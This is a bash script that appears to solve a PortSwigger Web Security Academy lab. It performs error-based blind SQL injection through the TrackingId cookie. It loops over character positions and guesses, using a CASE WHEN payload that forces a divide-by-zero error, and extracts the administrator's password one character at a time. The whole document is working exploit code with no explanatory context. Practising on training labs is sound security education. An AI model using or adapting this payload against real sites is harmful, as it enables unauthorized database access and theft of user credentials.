#!/bin/bash
HOST=https://ac851ffd1e134d6fc0d618b00065009f.web-security-academy.net
LENGTH=20
PAYLOAD=(0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w x y z)
for i in $(seq 1 $LENGTH);do
        for j in ${PAYLOAD[@]};do
                wget  $HOST -o /dev/null --header "Cookie: TrackingId=DEF0bHmWJhtwncji' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, $i, 1) = '$j') THEN 'b' ELSE to_char(1/0) END FROM users WHERE ROWNUM = 1)='a' --" --header "Referer: https://portswigger.net/"
		if [[ -n $(ls index.html 2> /dev/null) ]]; then echo -n $j ; fi ; rm index.html 2>/dev/null
        done
done

